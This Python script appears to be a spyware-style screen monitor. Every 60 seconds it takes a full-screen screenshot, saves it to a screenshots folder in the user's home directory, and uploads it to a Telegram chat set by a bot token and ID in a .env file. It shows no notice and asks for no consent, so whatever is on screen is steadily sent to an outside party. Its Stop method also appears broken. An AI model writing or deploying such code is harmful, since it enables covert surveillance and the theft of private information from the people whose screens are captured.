import pyautogui
import schedule
from datetime import datetime
import os
import time
import telepot
from dotenv import load_dotenv 
load_dotenv('.env')

class ScreenShots():
    def __init__(self) -> None:
        self.screenShotter = schedule.every(60).seconds.do(self.capture_screen)
        self.token = os.getenv('TOKEN')
        self.bot = telepot.Bot(token=self.token)
        self.id = os.getenv('ID')

    def capture_screen(self):
        home_dir = os.path.expanduser("~")

        # Create a screenshots directory if it doesn't exist
        if not os.path.exists(home_dir+ "\\screenshots"):
            os.mkdir(home_dir+"\\screenshots")
            
        # Construct the screenshot path using the current date and time
        timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M")
        screenshot_name = f"sc-{os.getlogin()}-{timestamp}.png"
        screenshot_path = os.path.join(home_dir,"screenshots", screenshot_name)
        
        # Capture the screenshot and save it to the specified path
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        with open(file=screenshot_path,mode='rb') as scsh:    
            try:
                self.bot.sendPhoto(self.id, photo=scsh)
            except Exception:
                print("couldn't send the screenshot")

    def Run(self):
        while True:
            schedule.run_pending()
            time.sleep(1)

    def Stop(self):
        self.screenShotter.cancel_after.now()
